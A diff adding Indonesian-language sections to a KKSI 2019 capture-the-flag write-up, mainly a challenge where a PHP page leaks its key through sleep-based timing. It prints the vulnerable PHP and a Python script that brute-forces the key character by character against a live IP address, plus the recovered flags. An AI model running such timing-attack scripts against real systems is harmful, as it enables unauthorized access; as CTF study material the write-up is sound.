@@ -63,6 +63,8 @@ print(r.post(url, data=data).text)
 
 Flag : **KKSI2019{64_32_16_8_4_2_0}**
 
+## Forensic
+
 ### Read the Log
 
 Deskripsi :
@@ -86,3 +88,71 @@ Kami melakukan cat dan flagnya pun ditemukan.
 ![enter image description here](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/Read_the_Log/Log%20-%201.png)
 Flag : **KKSI2019{Emang_Sabar_Adalah_Kuncinya}** 
 
+## Misc
+
+### KKSI Lost The Key
+
+Deskripsi :
+> [Here](http://202.148.2.243:30001)
+
+Solusi :
+Pada link yang diberikan, ada kode PHP yang ditampilkan sebagai berikut :
+```
+`<?php  
+include 'flag.php';  
+  
+$key = KEY;  
+  
+if(isset($_GET['time'])){  
+$human = $_GET['time'];  
+if(strlen($_GET['time']) == ( strlen($key) - 1)){  
+	sleep(5);  
+}  
+  
+if(strlen($_GET['time']) == strlen($key)){  
+	if($human == $key){  
+		echo FLAG; 
+	}  
+  
+	for($i=0;$i<strlen($key); $i++){  
+		if($human[$i] == $key[$i]){  
+			sleep(3);  
+		}  
+	}  
+}  
+}  
+  
+  
+  
+show_source(__FILE__);`
+```
+
+Bila dilihat, ada 2 bagian dalam kode tersebut, yaitu cek panjang time dan cek isi time per karakter. Untuk cek panjang, kami memasukkan string sebarang dan diketahui bahwa pada panjang string = 2, terjadi `sleep(5)` yang menyebabkan waktu  loading lebih lama. Maka kami menciptakan kode di Python untuk melakukan loop untuk mencari string yang dibutuhkan untuk bisa menyamai `$key`.
+
+Berikut ada kode yang kami buat. 
+```
+import requests as req, time
+flag = ''
+poss = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
+while len(flag) != 3:
+  for i in poss:
+    if True :
+      address = 'http://202.148.2.243:30001/?time={}{}{}'.format(flag, i, '|'*(2-len(flag)))
+      start = time.time()
+      r = req.get(address)
+      res = r.text
+      end = time.time()
+      print('Trying : ', address)
+      #print(d['search'])
+      print(end - start)
+      if end - start > 3*len(flag) + 3:
+        flag += i
+        print('Found!', i)
+        break
+
+```
+
+Kami menemukan bahwa $key = 1Ap, maka kami masukkan di browser dan flagnya ditemukan.
+
+![enter image description here](https://raw.githubusercontent.com/kerupuksambel/ctf-writeup/master/KKSI_2019/KKSI_Lost_the_Key/Key%20-%201.png)
+Flag : **KKSI2019{Time_is_Money_Also_Time_is_flag}**
